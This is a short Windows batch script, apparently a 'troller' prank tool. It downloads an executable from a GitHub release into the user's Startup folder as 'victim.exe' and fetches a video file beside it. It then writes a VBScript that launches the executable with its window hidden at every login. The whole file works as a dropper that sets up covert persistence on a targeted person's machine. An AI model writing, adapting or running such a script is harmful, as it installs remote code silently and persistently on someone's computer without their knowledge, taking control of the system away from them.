@echo off
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: download the executable and the video file
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"

:: create a vbs file to run the executable silently
echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP_FOLDER%\run_victim.vbs"
echo WshShell.Run chr(34) ^& "%STARTUP_FOLDER%\victim.exe" ^& Chr(34), 0 >> "%STARTUP_FOLDER%\run_victim.vbs"
echo Set WshShell = Nothing >> "%STARTUP_FOLDER%\run_victim.vbs"

echo Files have been moved to startup folder.
